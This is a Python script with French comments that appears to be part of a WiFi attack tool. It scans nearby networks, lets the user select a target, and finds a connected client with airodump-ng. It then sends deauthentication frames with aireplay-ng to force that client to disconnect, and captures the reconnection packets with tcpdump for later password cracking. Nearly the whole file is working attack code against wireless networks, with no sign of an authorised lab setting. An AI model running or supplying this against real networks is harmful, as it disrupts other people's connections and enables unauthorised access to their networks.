import subprocess
import iwlist
import time
import os
import glob
from config import card
from config import withoutmonitor
from monitor import activate_monitor
import pandas as pd




def scan_wifi_networks(interface):
    # Exécute la commande iwlist pour scanner les réseaux WiFi
    content = iwlist.scan(interface=interface)
    cells = iwlist.parse(content)
    return cells

def display_wifi_list_and_wifi_choice(withoutmonitor):
    # Scanne les réseaux WiFi
    interface = withoutmonitor
    wifi_networks = scan_wifi_networks(interface)
    value=[""]

    # Affichage des informations pour chaque réseau avec un numéro associé
    for i, cell in enumerate(wifi_networks, 1):
        mac_address = cell['mac']
        channel = cell['channel']
        essid = cell['essid']
        encryption = cell['encryption']
        value.append(f"{i}. ESSID: {essid}\n, MAC Address: {mac_address}\n, Channel: {channel}\n, Security: {encryption}\n\n")
        #print(f"{i}. ESSID: {essid}, MAC Address: {mac_address}, Channel: {channel}, Security: {encryption}")
    return(value, wifi_networks)

def attacknetwork(wifi_networks, selected_index):
    # Vérifie que l'index sélectionné est valide
    print(len(wifi_networks))
    if 0 <= selected_index < len(wifi_networks):
        selected_cell = wifi_networks[selected_index]

        # Stocke les valeurs du réseau sélectionné dans des variables
        machinal = selected_cell['mac']
        essaifinal = selected_cell['essid']
        encryptionfinal = selected_cell['encryption']
        channel_final = selected_cell['channel']

        # Utilise les valeurs sélectionnées comme nécessaire dans le reste du code
        print(f"Vous avez sélectionné le réseau :\nESSID: {essaifinal}\nMAC Address: {machinal}\nChannel: {channel_final}\nSecurity: {encryptionfinal}")

        # Appelle la fonction pour exécuter Aircrack-ng sur le réseau choisi
        execute_aircrack(selected_cell, channel_final)
    else:
        print("Index non valide. Veuillez sélectionner un numéro de réseau valide.")
        

def find_client_mac(bssid, channel, card):
    try:
        # Supprime le contenu de airdumpfile
        for filename in os.listdir('airdumpfile/'):
            if os.path.isfile(os.path.join('airdumpfile/', filename)):
                os.remove(os.path.join('airdumpfile/', filename))

        # Ouvre un fichier vide pour rediriger la sortie
        with open(os.devnull, 'w') as devnull:
            # Exécute la commande airodump-ng pour afficher les informations sur les clients
            airodump_command = ['sudo', 'airodump-ng', '-w', 'airdumpfile/airdump', '--bssid', bssid, '--channel', str(channel), card]

            # Utilisation de Popen pour exécuter la commande en arrière-plan
            process = subprocess.Popen(airodump_command, stdout=devnull, stderr=devnull, text=True)

            # Attendez quelques secondes pour que la capture ait lieu
            time.sleep(10)

            # Tuez le processus
            process.kill()
            
            # Charge le fichier CSV en tant que dataframe pandas
            csv_file = "airdumpfile/airdump-01.csv"
            df = pd.read_csv(csv_file, skiprows=4)  # Ignorer les 4 premières lignes du fichier

       	    # Assurez-vous que les noms de colonnes utilisés correspondent exactement aux noms réels
            relevant_columns = ['Station MAC', ' BSSID']  # Ajoutez l'espace au début de ' BSSID'

            # Sélectionne uniquement les colonnes pertinentes
            df = df[relevant_columns]

            # Retirer les espaces au début des adresses MAC
            df[' BSSID'] = df[' BSSID'].str.strip()

            # Filtre les lignes pour le BSSID spécifié
            filtered_rows = df[df[' BSSID'] == bssid]

            if not filtered_rows.empty:
                # Récupère l'adresse MAC de la station associée au BSSID spécifié
                station_mac = filtered_rows.iloc[0]['Station MAC']
                print(station_mac)
                time.sleep(2)
                return station_mac
            else:
                print(f"Aucune station MAC trouvée pour le BSSID {bssid}")
                return None

    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de la recherche de l'adresse MAC du client : {e.stderr}")

    return None
    
    
def execute_aircrack(selected_cell, channel_final, worldlist_path='worldlist.txt', capture_file='cap.cap'):
    # Récupère les informations nécessaires du réseau sélectionné
    bssid = selected_cell['mac']

    try:
        activate_monitor(withoutmonitor)
        time.sleep(2)
        # Trouve l'adresse MAC d'un client associé
        client_mac = find_client_mac(bssid, channel_final, card)

        if client_mac:
            print(f"Adresse MAC du client associé : {client_mac}")

            # Exécute l'attaque de désauthentification avec aireplay-ng
            deauth_command = ['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', client_mac, 'wlan0mon']
            subprocess.run(deauth_command, check=True)

            # Capture les paquets de reconnexion avec tcpdump
            capture_command = ['tcpdump', '-i', 'wlan0mon', '-c', '1', '-w', 'reconnect_capture.pcap',f'(ether dst {bssid} and ether src {client_mac})']
            subprocess.run(capture_command, check=True)

            print("Paquet de reconnexion capturé!")
        else:
            print("Aucun client associé trouvé.")

    except subprocess.CalledProcessError as e:
        # Gère les erreurs lors de l'exécution de la commande
        print(f"Erreur lors de l'exécution de la commande Aircrack-ng : {e.stderr}")

    finally:
        # Désactive le mode moniteur
        subprocess.run(["sudo", "python3", "monitor.py", "-d"], check=True)


if __name__ == "__main__":
    # Appelle la fonction pour afficher la liste des réseaux et demander à l'utilisateur de choisir
    display_wifi_list_and_wifi_choice(withoutmonitor)

